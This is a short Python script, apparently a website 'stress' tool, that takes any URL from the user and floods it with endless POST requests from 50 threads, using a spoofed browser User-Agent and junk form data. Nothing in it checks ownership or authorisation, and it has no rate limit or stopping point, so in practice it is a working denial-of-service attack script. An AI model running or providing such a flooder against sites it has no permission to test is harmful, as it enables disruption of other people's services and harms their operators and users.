import requests
import threading

url= input("Paste the website that you want to stress:")
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
data={'USERNAME':'IJSDSdsa$@!$A'}

def go():
    while True:
        response= requests.post(url, headers=headers, data=data)
        print(response)               

threads= []

for i in range(50):
    t= threading.Thread(target=go)
    t.daemon= True
    threads.append(t)

for i in range(50):
    threads[i].start()

